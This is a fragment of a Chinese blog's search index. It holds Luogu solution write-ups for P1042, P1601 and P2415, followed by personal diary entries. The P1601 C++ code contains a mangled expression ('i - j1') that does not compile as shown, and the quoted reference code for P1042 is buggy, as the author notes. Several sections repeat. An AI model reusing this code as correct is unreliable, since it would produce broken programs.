添加list子项目的测试","date":"2025-03-18","objectID":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/:7:0","series":null,"tags":["CMake"],"title":"ModernCppStarter配置过程记录","uri":"/moderncppstarter%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/#添加list子项目的测试"},{"categories":["算法"],"content":" 12 题目背景国际乒联现在主席沙拉拉自从上任以来就立志于推行一系列改革，以推动乒乓球运动在全球的普及。其中 11 分制改革引起了很大的争议，有一部分球员因为无法适应新规则只能选择退役。华华就是其中一位，他退役之后走上了乒乓球研究工作，意图弄明白 11 分制和 21 分制对选手的不同影响。在开展他的研究之前，他首先需要对他多年比赛的统计数据进行一些分析，所以需要你的帮忙。 ","date":"2025-03-17","objectID":"/%E4%B9%92%E4%B9%93%E7%90%83/:1:0","series":["算法题解"],"tags":["模拟"],"title":"P1042 [NOIP 2003 普及组] 乒乓球","uri":"/%E4%B9%92%E4%B9%93%E7%90%83/#题目背景"},{"categories":["算法"],"content":" 13 题目描述华华通过以下方式进行分析，首先将比赛每个球的胜负列成一张表，然后分别计算在 11 分制和 21 分制下，双方的比赛结果（截至记录末尾）。 比如现在有这么一份记录，（其中 W 表示华华获得一分，L 表示华华对手获得一分）： text WWWWWWWWWWWWWWWWWWWWWWLW 在 11 分制下，此时比赛的结果是华华第一局 11 比 0 获胜，第二局 11 比 0 获胜，正在进行第三局，当前比分 1 比 1。而在 21 分制下，此时比赛结果是华华第一局 21 比 0 获胜，正在进行第二局，比分 2 比 1。如果一局比赛刚开始，则此时比分为 0 比 0。直到分差大于或者等于 2，才一局结束。 注意：当一局比赛结束后，下一局立刻开始。 你的程序就是要对于一系列比赛信息的输入（WL 形式），输出正确的结果。 ","date":"2025-03-17","objectID":"/%E4%B9%92%E4%B9%93%E7%90%83/:2:0","series":["算法题解"],"tags":["模拟"],"title":"P1042 [NOIP 2003 普及组] 乒乓球","uri":"/%E4%B9%92%E4%B9%93%E7%90%83/#题目描述"},{"categories":["算法"],"content":" 14 输入格式每个输入文件包含若干行字符串，字符串由大写的 W 、 L 和 E 组成。其中 E 表示比赛信息结束，程序应该忽略 E 之后的所有内容。 ","date":"2025-03-17","objectID":"/%E4%B9%92%E4%B9%93%E7%90%83/:3:0","series":["算法题解"],"tags":["模拟"],"title":"P1042 [NOIP 2003 普及组] 乒乓球","uri":"/%E4%B9%92%E4%B9%93%E7%90%83/#输入格式"},{"categories":["算法"],"content":" 15 输出格式输出由两部分组成，每部分有若干行，每一行对应一局比赛的比分（按比赛信息输入顺序）。其中第一部分是 11 分制下的结果，第二部分是 21 分制下的结果，两部分之间由一个空行分隔。 ","date":"2025-03-17","objectID":"/%E4%B9%92%E4%B9%93%E7%90%83/:4:0","series":["算法题解"],"tags":["模拟"],"title":"P1042 [NOIP 2003 普及组] 乒乓球","uri":"/%E4%B9%92%E4%B9%93%E7%90%83/#输出格式"},{"categories":["算法"],"content":" 16 输入输出样例输入 text WWWWWWWWWWWWWWWWWWWW WWLWE 输出 text 11:0 11:0 1:1 21:0 2:1 ","date":"2025-03-17","objectID":"/%E4%B9%92%E4%B9%93%E7%90%83/:5:0","series":["算法题解"],"tags":["模拟"],"title":"P1042 [NOIP 2003 普及组] 乒乓球","uri":"/%E4%B9%92%E4%B9%93%E7%90%83/#输入输出样例"},{"categories":["算法"],"content":" 17 说明/提示每行至多 25 个字母，最多有 2500 行。 （注：事实上有一个测试点有 2501 行数据。） 【题目来源】 NOIP 2003 普及组第一题 ","date":"2025-03-17","objectID":"/%E4%B9%92%E4%B9%93%E7%90%83/:6:0","series":["算法题解"],"tags":["模拟"],"title":"P1042 [NOIP 2003 普及组] 乒乓球","uri":"/%E4%B9%92%E4%B9%93%E7%90%83/#说明提示"},{"categories":["算法"],"content":" 18 最开始的思路这是一道模拟题，其主要的思路是模拟两个人比分。我的思路是： 逐个字符读取获取到的字符串，如果遇到\\n就跳过不读，读到E就停止。 将E添加到读取的字符串末尾，用来表征结束。 接下来分别按照11分制和21分制来进行模拟，中间输出比分。如果读到E，或者两位同学分差大于等于2分且至少一位同学达到11/21分，就打印当前比分，并且把两位同学比分置0。如果读到的是W，第一位同学加一分。如果读到的是L，第二位同学加一分。 在两轮模拟中间加一行空行。 ","date":"2025-03-17","objectID":"/%E4%B9%92%E4%B9%93%E7%90%83/:7:0","series":["算法题解"],"tags":["模拟"],"title":"P1042 [NOIP 2003 普及组] 乒乓球","uri":"/%E4%B9%92%E4%B9%93%E7%90%83/#最开始的思路"},{"categories":["算法"],"content":" 19 遇到的问题 在获取输入时，不仅是\\n需要忽略掉，\\r和' '也需要忽略掉。否则会读入多余的字符（这里我大意了，一开始只忽略了\\n，没有考虑其他的多余字符） 可能读到E的时候刚好一局比完，这时候仍然要输出0:0（这个点很坑）。因此读到E和一局比完的情况需要分开考虑。 在进行\u0026\u0026和||判断时需要加上括号，保证优先级。 在第二次模拟开始前，需要将两人的分数重新置0 最后要输出一行空行 ","date":"2025-03-17","objectID":"/%E4%B9%92%E4%B9%93%E7%90%83/:8:0","series":["算法题解"],"tags":["模拟"],"title":"P1042 [NOIP 2003 普及组] 乒乓球","uri":"/%E4%B9%92%E4%B9%93%E7%90%83/#遇到的问题"},{"categories":["算法"],"content":" 20 正确实现 cpp #include \u003ciostream\u003e using namespace std; int main(void) { string game; char ch; while((ch = getchar()) != 'E') { if(ch != 13 \u0026\u0026 ch != ' ' \u0026\u0026 ch != 10) game += ch; } game += 'E'; int Wp = 0; int Lp = 0; for(char ch: game) { if((abs(Wp-Lp) \u003e= 2 \u0026\u0026 (Wp \u003e= 11 || Lp \u003e= 11))) { cout \u003c\u003c Wp \u003c\u003c \":\" \u003c\u003c Lp \u003c\u003c endl; Wp = 0; Lp = 0; } if(ch == 'E') { cout \u003c\u003c Wp \u003c\u003c \":\" \u003c\u003c Lp \u003c\u003c endl; break; } if(ch == 'W') { Wp += 1; } else { Lp += 1; } } cout \u003c\u003c endl; Wp = 0; Lp = 0; for(char ch: game) { if(((abs(Wp-Lp) \u003e= 2) \u0026\u0026 (Wp \u003e= 21 || Lp \u003e= 21))) { cout \u003c\u003c Wp \u003c\u003c \":\" \u003c\u003c Lp \u003c\u003c endl; Wp = 0; Lp = 0; } if(ch == 'E') { cout \u003c\u003c Wp \u003c\u003c \":\" \u003c\u003c Lp \u003c\u003c endl; break; } if(ch == 'W') { Wp += 1; } else { Lp += 1; } } cout \u003c\u003c endl; return 0; } 成功！ ","date":"2025-03-17","objectID":"/%E4%B9%92%E4%B9%93%E7%90%83/:9:0","series":["算法题解"],"tags":["模拟"],"title":"P1042 [NOIP 2003 普及组] 乒乓球","uri":"/%E4%B9%92%E4%B9%93%E7%90%83/#正确实现"},{"categories":["算法"],"content":" 21 总结该题提醒我们： 要谨慎考虑输入的方式和输入的字符串，在输入时要处理掉一切可能的多余字符； 要考虑到所有的corner case，谨慎读题； 在多个判断时最好加上括号，保证优先级； 多次模拟中间变量要置0； 确保输出格式正确，换行和空行的数目正确； ","date":"2025-03-17","objectID":"/%E4%B9%92%E4%B9%93%E7%90%83/:10:0","series":["算法题解"],"tags":["模拟"],"title":"P1042 [NOIP 2003 普及组] 乒乓球","uri":"/%E4%B9%92%E4%B9%93%E7%90%83/#总结"},{"categories":["算法"],"content":" 22 深基参考题解《深基》上给了一个版本的答案，但是我用其中一个测试点跑了，发现这个答案是通不过测试的。所以摆在这里仅供参考。 cpp #include \u003ciostream\u003e #include \u003ccmath\u003e using namespace std; int f[2] = {11,21}; // 将两轮分制 int a[25 * 2500 + 10], n = 0; int main() { char tmp; freopen(\"1.in\",\"r\",stdin); freopen(\"1.out\",\"w\",stdout); while(1) { cin \u003e\u003e tmp; if(tmp == 'E') break; else if(tmp == 'W') a[n++] = 1; else if(tmp == 'L') a[n++] = 0; } for(int k = 0; k \u003c 2; k++) { int w = 0, l = 0; for(int i = 0; i \u003c n; i++) { w += a[i]; l += l - a[i]; if((max(w,l) \u003e= f[k]) \u0026\u0026 abs(w-l) \u003e= 2) { cout \u003c\u003c w \u003c\u003c \":\" \u003c\u003c l \u003c\u003c endl; w = l = 0; } } cout \u003c\u003c w \u003c\u003c \":\" \u003c\u003c l \u003c\u003c endl; cout \u003c\u003c endl; } return 0; } ","date":"2025-03-17","objectID":"/%E4%B9%92%E4%B9%93%E7%90%83/:11:0","series":["算法题解"],"tags":["模拟"],"title":"P1042 [NOIP 2003 普及组] 乒乓球","uri":"/%E4%B9%92%E4%B9%93%E7%90%83/#深基参考题解"},{"categories":["算法"],"content":" 9 题目描述高精度加法，相当于 a+b problem，不用考虑负数。 ","date":"2025-03-17","objectID":"/p1601-a-b-problem%E9%AB%98%E7%B2%BE/:1:0","series":["算法题解"],"tags":["高精度"],"title":"P1601 A+B Problem（高精）","uri":"/p1601-a-b-problem%E9%AB%98%E7%B2%BE/#题目描述"},{"categories":["算法"],"content":" 10 输入格式分两行输入。a,b≤10500。 ","date":"2025-03-17","objectID":"/p1601-a-b-problem%E9%AB%98%E7%B2%BE/:2:0","series":["算法题解"],"tags":["高精度"],"title":"P1601 A+B Problem（高精）","uri":"/p1601-a-b-problem%E9%AB%98%E7%B2%BE/#输入格式"},{"categories":["算法"],"content":" 11 输出格式输出只有一行，代表 a+b 的值。 ","date":"2025-03-17","objectID":"/p1601-a-b-problem%E9%AB%98%E7%B2%BE/:3:0","series":["算法题解"],"tags":["高精度"],"title":"P1601 A+B Problem（高精）","uri":"/p1601-a-b-problem%E9%AB%98%E7%B2%BE/#输出格式"},{"categories":["算法"],"content":" 12 输入输出样例输入 #1 text 1 1 输出 #1 text 2 输入 #2 text 1001 9099 输出 #2 text 10100 ","date":"2025-03-17","objectID":"/p1601-a-b-problem%E9%AB%98%E7%B2%BE/:4:0","series":["算法题解"],"tags":["高精度"],"title":"P1601 A+B Problem（高精）","uri":"/p1601-a-b-problem%E9%AB%98%E7%B2%BE/#输入输出样例"},{"categories":["算法"],"content":" 13 说明/提示20% 的测试数据，$0≤a,b≤10^{9}$； 40% 的测试数据，$0≤a,b≤10^{18}$。 ","date":"2025-03-17","objectID":"/p1601-a-b-problem%E9%AB%98%E7%B2%BE/:5:0","series":["算法题解"],"tags":["高精度"],"title":"P1601 A+B Problem（高精）","uri":"/p1601-a-b-problem%E9%AB%98%E7%B2%BE/#说明提示"},{"categories":["算法"],"content":" 14 思路 将两个长数字作为字符串读取，转化为数字后存在数组里 使用i和j记录两个字符串的长度，分3种情况讨论 将结果存在一个大数组里，用s_index追踪最后一位 用变量carry保存每次的进位 分3种情况讨论，从两个数对齐的最后一位开始向前计算。如果某个数字比另一个数字大，则用carry加上那个数字的最后一位，然后依次计算到最高位，总体算法和前面相同。 最后从最高位（s_index所在位开始向前输出），忽略掉前导0。如果结果本身就是0，s_index最后将等于-1，这样可以直接输出0。否则就从高位到低位依次输出。 ","date":"2025-03-17","objectID":"/p1601-a-b-problem%E9%AB%98%E7%B2%BE/:6:0","series":["算法题解"],"tags":["高精度"],"title":"P1601 A+B Problem（高精）","uri":"/p1601-a-b-problem%E9%AB%98%E7%B2%BE/#思路"},{"categories":["算法"],"content":" 15 Debug记录 sum数组一开始没有设0，下次每次在使用新的数组之前，一定要把数组置0，否则可能会影响后续的读取； 无论各位的和是否大于等于10，其carry都等于s / 10，这个是一定要计算的，否则可能出现上一次carry = 1，这次carry = 0，但是carry忘记了重新计算，导致把1加到了这一位； 最高位可能有进位，无论是否有，都要把该为设置p为carry。如果carry = 0，这个前导0会在后面打印时候忽略。这是一种统一处理的办法。 注意两个数都是0的情况，结果等于0，如果忽略这个0，就什么也打不出来。判断结果是否为0的条件是判断s_index是否递减到-1。 记得从高位往低位输出，顺序不要弄反了。 ","date":"2025-03-17","objectID":"/p1601-a-b-problem%E9%AB%98%E7%B2%BE/:7:0","series":["算法题解"],"tags":["高精度"],"title":"P1601 A+B Problem（高精）","uri":"/p1601-a-b-problem%E9%AB%98%E7%B2%BE/#debug记录"},{"categories":["算法"],"content":" 16 C++实现 cpp #include \u003ciostream\u003e #include \u003calgorithm\u003e using namespace std; int a1[500],a2[500]; int main(void) { // freopen(\"4.in\",\"r\",stdin); // freopen(\"4.out\",\"w\",stdout); string s1,s2; cin \u003e\u003e s1 \u003e\u003e s2; int i = 0; for(char ch:s1) { a1[i] = ch - '0'; i++; } int j = 0; for(char ch:s2) { a2[j] = ch - '0'; j++; } int sum[1000]; for(int i = 0; i \u003c 1000; i++) sum[i] = 0; int s_index = 0; int carry = 0; if(i == j) { for(int k = j-1; k \u003e= 0; k--) { int s = carry + a1[k] + a2[k]; carry = s / 10; s = s % 10; sum[s_index] = s; s_index ++; } sum[s_index] = carry; } else if(i \u003c j) { for(int k = 1; k \u003c= i; k++) { int a1_index = i - k; int a2_index = j - k; int s = carry + a1[a1_index] + a2[a2_index]; carry = s / 10; s = s % 10; sum[s_index] = s; s_index ++; } for(int k = j-i-1; k \u003e= 0; k--) { int s = carry + a2[k]; carry = s / 10; s = s % 10; sum[s_index] = s; s_index ++; } sum[s_index] = carry; } else { for(int k = 1; k \u003c= j; k++) { int a1_index = i - k; int a2_index = j - k; int s = carry + a1[a1_index] + a2[a2_index]; carry = s / 10; s = s % 10; sum[s_index] = s; s_index ++; } for(int k = i - j1; k \u003e= 0; k--) { int s = carry + a1[k]; carry = s / 10; s = s % 10; sum[s_index] = s; s_index ++; } sum[s_index] = carry; } while(sum[s_index] == 0) { s_index --;} if(s_index \u003c 0) { cout \u003c\u003c 0 \u003c\u003c endl; return 0; } for(int i = s_index; i \u003e= 0; i--) { cout \u003c\u003c sum[i]; } cout \u003c\u003c endl; return 0; } ","date":"2025-03-17","objectID":"/p1601-a-b-problem%E9%AB%98%E7%B2%BE/:8:0","series":["算法题解"],"tags":["高精度"],"title":"P1601 A+B Problem（高精）","uri":"/p1601-a-b-problem%E9%AB%98%E7%B2%BE/#c实现"},{"categories":["算法"],"content":" 23 题目描述给定一个集合 $s$（集合元素数量 ≤30），求出此集合所有子集元素之和。 ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:1:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#题目描述"},{"categories":["算法"],"content":" 24 输入格式集合中的元素（元素 ≤1000） ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:2:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#输入格式"},{"categories":["算法"],"content":" 25 输出格式$s$ 所有子集元素之和。 ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:3:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#输出格式"},{"categories":["算法"],"content":" 26 输入输出样例输入 text 2 3 输出 text 10 ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:4:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#输入输出样例"},{"categories":["算法"],"content":" 27 说明/提示","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:5:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#说明提示"},{"categories":["算法"],"content":" 28 题目描述给定一个集合 $s$（集合元素数量 ≤30），求出此集合所有子集元素之和。 ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:6:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#题目描述-1"},{"categories":["算法"],"content":" 29 输入格式集合中的元素（元素 ≤1000） ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:7:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#输入格式-1"},{"categories":["算法"],"content":" 30 输出格式$s$ 所有子集元素之和。 ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:8:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#输出格式-1"},{"categories":["算法"],"content":" 31 输入输出样例输入 text 2 3 输出 text 10 ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:9:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#输入输出样例-1"},{"categories":["算法"],"content":" 32 说明/提示【样例解释】 text 子集为：∅,{2},{3},{2,3}，和为 2+3+2+3=10。 【数据范围】 对于 100% 的数据，$1 \\le \\vert s∣\\le 30$，$1≤s_{i}​≤1000$，s 所有子集元素之和 ≤$10^{18}$。 ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:10:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#说明提示-1"},{"categories":["算法"],"content":" 33 最开始的思路我一开始想到的是，使用递归实现。以前在做幂集相关题目的时候，首要的方法是考虑这个元素在集合内，或者不在集合内，进行两种递归，然后返回最终的幂集。但是问题是，当时我们返回的是一个子集的集合，然而现在我们需要返回所有子集中的元素的和。我们当然可以分2种情况，但是我们并不知道在没有加入当前元素时，集合中有多少子集，因此也就无法对每个子集分加入该元素和不加该元素进行讨论。如果要这么做的话，我们需要一个变长的多维度的数组，而且在这种前提下还只能求出幂集。对于幂集内的所有元素求和，还需要进一步的对多维数组进行操作。如果使用C++的话，这样显然是过于繁杂了。虽然说使用Python的话，我们可以很容易的构造这样的多层list，然后用for in语句进行递归。但是现在使用的是C++，所以用多维数组先求幂集再求和这条路，行不通。在满腹疑惑之下，我看了题解，恍然大悟。 ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:11:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#最开始的思路"},{"categories":["算法"],"content":" 34 题解的算法首先我们考虑子集的构造过程。每个元素在或不在这个子集中，我们有$n$个元素，因此有$2^n$个子集。那么每个元素会出现在一半数目的子集中（因为出现和不出现的概率是均等的），因此对于每个元素，它会出现在$2^{n-1}$个子集当中。 若输入元素为$a_{i}$，那么$a_{i}$出现在$2^{n-1}$个子集当中。而现在有$n$个元素，它们每个都出现在$2^{n-1}$个子集中，因此子集的元素之和就等于所有元素之和乘上$2^{n-1}$。妙哉！ ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:12:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#题解的算法"},{"categories":["算法"],"content":" 35 C++语言初步实现有了思路，我们现在开始使用C++实现这个算法。实现如下： cpp #include \u003ciostream\u003e #include \u003csstream\u003e #include \u003ccmath\u003e using namespace std; int main(void) { int a[30]; for(int i = 0; i \u003c 30; i++) { a[i] = 0; } string line; getline(cin,line); istringstream is(line); string num; int count = 0; int sum = 0; while(is \u003e\u003e num) { a[count] = stoi(num); sum += a[count]; count++; } cout \u003c\u003c sum * pow(2,count-1) \u003c\u003c endl; return 0; } 可是测试出来是2个WA和3个AC，欸，为什么？ ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:13:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#c语言初步实现"},{"categories":["算法"],"content":" 36 警惕！我们发现两个可疑点： 我们使用int类型来存储sum，范围会不会超？ sum * pow(2,count-1)直接打出来的是科学输入法的值，而我们需要一个确切的整数值。 因此可以做如下修改： 将int类型修改为long long 添加sum *= pow(2,count-1)，然后再使用cout打印sum ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:14:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#警惕"},{"categories":["算法"],"content":" 37 正确实现 cpp #include \u003ciostream\u003e #include \u003csstream\u003e #include \u003ccmath\u003e using namespace std; int main(void) { int a[30]; for(int i = 0; i \u003c 30; i++) { a[i] = 0; } string line; getline(cin,line); istringstream is(line); string num; int count = 0; long long sum = 0; while(is \u003e\u003e num) { a[count] = stoi(num); sum += a[count]; count++; } sum *= pow(2,count-1); cout \u003c\u003c sum \u003c\u003c endl; return 0; } 成功！ ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:15:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#正确实现"},{"categories":["算法"],"content":" 38 总结该题提醒我们： 在递归时要想清楚这个递归到底返回的是什么东西，递归的格式和base case要搞清楚 存储大数要使用long long cout如果直接输出大数，会打出科学输入法的值，因此要先用变量存储，再打印出来就可以啦！ 【样例解释】 text 子集为：∅,{2},{3},{2,3}，和为 2+3+2+3=10。 【数据范围】 对于 100% 的数据，$1 \\le \\vert s∣\\le 30$，$1≤s_{i}​≤1000$，s 所有子集元素之和 ≤$10^{18}$。 ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:16:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#总结"},{"categories":["算法"],"content":" 39 最开始的思路我一开始想到的是，使用递归实现。以前在做幂集相关题目的时候，首要的方法是考虑这个元素在集合内，或者不在集合内，进行两种递归，然后返回最终的幂集。但是问题是，当时我们返回的是一个子集的集合，然而现在我们需要返回所有子集中的元素的和。我们当然可以分2种情况，但是我们并不知道在没有加入当前元素时，集合中有多少子集，因此也就无法对每个子集分加入该元素和不加该元素进行讨论。如果要这么做的话，我们需要一个变长的多维度的数组，而且在这种前提下还只能求出幂集。对于幂集内的所有元素求和，还需要进一步的对多维数组进行操作。如果使用C++的话，这样显然是过于繁杂了。虽然说使用Python的话，我们可以很容易的构造这样的多层list，然后用for in语句进行递归。但是现在使用的是C++，所以用多维数组先求幂集再求和这条路，行不通。在满腹疑惑之下，我看了题解，恍然大悟。 ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:17:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#最开始的思路-1"},{"categories":["算法"],"content":" 40 题解的算法首先我们考虑子集的构造过程。每个元素在或不在这个子集中，我们有$n$个元素，因此有$2^n$个子集。那么每个元素会出现在一半数目的子集中（因为出现和不出现的概率是均等的），因此对于每个元素，它会出现在$2^{n-1}$个子集当中。 若输入元素为$a_{i}$，那么$a_{i}$出现在$2^{n-1}$个子集当中。而现在有$n$个元素，它们每个都出现在$2^{n-1}$个子集中，因此子集的元素之和就等于所有元素之和乘上$2^{n-1}$。妙哉！ ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:18:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#题解的算法-1"},{"categories":["算法"],"content":" 41 C++语言初步实现有了思路，我们现在开始使用C++实现这个算法。实现如下： cpp #include \u003ciostream\u003e #include \u003csstream\u003e #include \u003ccmath\u003e using namespace std; int main(void) { int a[30]; for(int i = 0; i \u003c 30; i++) { a[i] = 0; } string line; getline(cin,line); istringstream is(line); string num; int count = 0; int sum = 0; while(is \u003e\u003e num) { a[count] = stoi(num); sum += a[count]; count++; } cout \u003c\u003c sum * pow(2,count-1) \u003c\u003c endl; return 0; } 可是测试出来是2个WA和3个AC，欸，为什么？ ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:19:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#c语言初步实现-1"},{"categories":["算法"],"content":" 42 警惕！我们发现两个可疑点： 我们使用int类型来存储sum，范围会不会超？ sum * pow(2,count-1)直接打出来的是科学输入法的值，而我们需要一个确切的整数值。 因此可以做如下修改： 将int类型修改为long long 添加sum *= pow(2,count-1)，然后再使用cout打印sum ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:20:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#警惕-1"},{"categories":["算法"],"content":" 43 正确实现 cpp #include \u003ciostream\u003e #include \u003csstream\u003e #include \u003ccmath\u003e using namespace std; int main(void) { int a[30]; for(int i = 0; i \u003c 30; i++) { a[i] = 0; } string line; getline(cin,line); istringstream is(line); string num; int count = 0; long long sum = 0; while(is \u003e\u003e num) { a[count] = stoi(num); sum += a[count]; count++; } sum *= pow(2,count-1); cout \u003c\u003c sum \u003c\u003c endl; return 0; } 成功！ ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:21:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#正确实现-1"},{"categories":["算法"],"content":" 44 总结该题提醒我们： 在递归时要想清楚这个递归到底返回的是什么东西，递归的格式和base case要搞清楚 存储大数要使用long long cout如果直接输出大数，会打出科学输入法的值，因此要先用变量存储，再打印出来就可以啦！ ","date":"2025-03-17","objectID":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/:22:0","series":["算法题解"],"tags":["递归"],"title":"P2415：集合求和","uri":"/%E9%9B%86%E5%90%88%E6%B1%82%E5%92%8C/#总结-1"},{"categories":null,"content":"记录本人2025年3月第三周的一些任务、心情、总结","date":"2025-03-17","objectID":"/2025%E5%B9%B43%E6%9C%88%E7%AC%AC%E4%B8%89%E5%91%A8%E8%AE%B0%E5%BD%95/","series":["记录"],"tags":null,"title":"2025年3月第三周记录","uri":"/2025%E5%B9%B43%E6%9C%88%E7%AC%AC%E4%B8%89%E5%91%A8%E8%AE%B0%E5%BD%95/"},{"categories":null,"content":" 1 2025-03-17 在过去几年内，我深受消化不良的困扰。每次吃完了饭，肚子都涨的叫人呼吸喘不来气。因为肥胖，每每运动都累的不行，最后减肥收效甚微。因为长期不消化， 学习和生活都受到了干扰。整个人长期无力，维生素D都被脂肪吸收了个干净。我一定要击败你！消！化！不！良！ 实在是喘不上气，必须得运动运动了。唉，怎么减个肥这么难啊。我一个黄花大闺女，怎么跟金胖子一个肚子啊。阿西吧。 T25一套做完 ✅ 2025-03-17 感觉消化一些了，可能确实像我妈妈所说的，我心理素质太差了，很多消化不良都是情绪问题，只要解决了情绪问题，什么都好说了。 感觉可能自己需要调整一下心态，不应该把工作学习任务当成负担，而是应该当作自己成长的阶梯。不管是不是有考核，都应该全力以赴去准备，无问西东。加油吧！如果把任务全部完成，我会变得更好，加油！ 我好感谢，我有徐明睿、有罗天笑、有诗诗微微、有爸爸妈妈、有小卉姐姐、有张俊老师。我爱他们。他们是我最好的朋友和家人。我一辈子都喜欢他们。 今天尽可能多的完成任务，早干完早轻松。 今天晚上10点照常睡觉，明天早上6点起床继续完成任务。 我发现我每天中午午饭后容易困倦，那么我应该中午睡一觉，然后完成健身任务，下午再继续完成任务，效率会更高。（发现自己的精力规律啦） 中午睡一觉以后，真的精神不错，而且只睡了一个小时，今天起来就没有头晕，继续保持！ ","date":"2025-03-17","objectID":"/2025%E5%B9%B43%E6%9C%88%E7%AC%AC%E4%B8%89%E5%91%A8%E8%AE%B0%E5%BD%95/:1:0","series":["记录"],"tags":null,"title":"2025年3月第三周记录","uri":"/2025%E5%B9%B43%E6%9C%88%E7%AC%AC%E4%B8%89%E5%91%A8%E8%AE%B0%E5%BD%95/#2025-03-17"},{"categories":null,"content":" 2 2025-03-18 有了博客以后，更喜欢写东西了，可以一直分享，很开心。 经过了一个上午的运转，现在是休息晒太阳时刻！去户外晒个太阳吧！ 吃午饭 ✅ 2025-03-18 下楼散步2圈 ✅ 2025-03-18 然后1点钟的时候上来睡一觉 ✅ 2025-03-18 起来完成T25健身操一套 ✅ 2025-03-18 洗个澡，换个衣服，喝点水 ✅ 2025-03-18 cmake这东西好像一段时间不用，就忘记怎么写了，见鬼，之前花了那么多时间掌握它 倒腾出新的博客界面（带任务列表、CS学习进度、周记等界面） ✅ 2025-03-18 倒腾出博客的周记 ✅ 2025-03-18 吃完晚饭有些涨，下楼走走 ✅ 2025-03-18 成功编译ModernCppStarter模板 ✅ 2025-03-18 记录ModernCppStarter的折腾过程 ✅ 2025-03-18 